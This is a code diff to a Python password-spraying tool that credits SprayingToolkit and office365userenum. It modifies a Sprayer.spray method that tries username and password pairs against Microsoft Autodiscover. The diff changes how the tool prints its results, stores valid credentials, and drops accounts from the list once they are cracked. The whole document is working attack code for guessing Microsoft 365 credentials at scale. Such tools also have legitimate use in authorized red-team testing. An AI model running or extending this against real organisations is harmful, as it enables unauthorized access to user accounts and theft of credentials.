@@ -4,6 +4,7 @@
 #           https://github.com/byt3bl33d3r/SprayingToolkit/
 # Based on: https://bitbucket.org/grimhacker/office365userenum/
 
+import sys
 import urllib3
 import asyncio
 import requests
@@ -89,17 +90,19 @@ class Sprayer:
     def spray(self, user, password, domain):
         """ Password spray Microsoft using Microsoft Autodiscover """
         try:
-            user = self.helper.check_email(user, domain)
-            auth = (user, password)
-            rsp  = self.method(self.url, headers=self.headers, auth=auth, timeout=self.timeout, proxies=self.proxy, verify=False)
+            email = self.helper.check_email(user, domain)
+            auth  = (email, password)
+            rsp   = self.method(self.url, headers=self.headers, auth=auth, timeout=self.timeout, proxies=self.proxy, verify=False)
 
             status = rsp.status_code
             if status in self.codes["status_codes"].keys():
                 if status != 200:
                     output += " (Manually confirm [2FA, Locked, etc.])"
 
-                print("[%s%s%s] %s:%s" % (text_colors.green, self.codes["status_codes"][status], text_colors.reset, user, password))
-                self.valid_creds[user] = password
+                sys.stdout.write("[%s%s%s] %s:%s%s\n" % (text_colors.green, self.codes["status_codes"][status], text_colors.reset, email, password, self.helper.space))
+                sys.stdout.flush()
+                self.valid_creds[email] = password
+                self.userlist.remove(user) # Remove valid creds
 
             else:
                 err,msg = ("BAD_PASSWD", password)
@@ -124,7 +127,8 @@ class Sprayer:
                                 self.userlist.remove(user)
                                 break
 
-                print("[%s%s%s] %s:%s" % (text_colors.red, err, text_colors.reset, user, msg))
+                sys.stdout.write("[%s%s%s] %s:%s%s\r" % (text_colors.red, err, text_colors.reset, email, msg, self.helper.space))
+                sys.stdout.flush()
 
         except Exception as e:
             if self.debug: print("[ERROR] %s" % e)
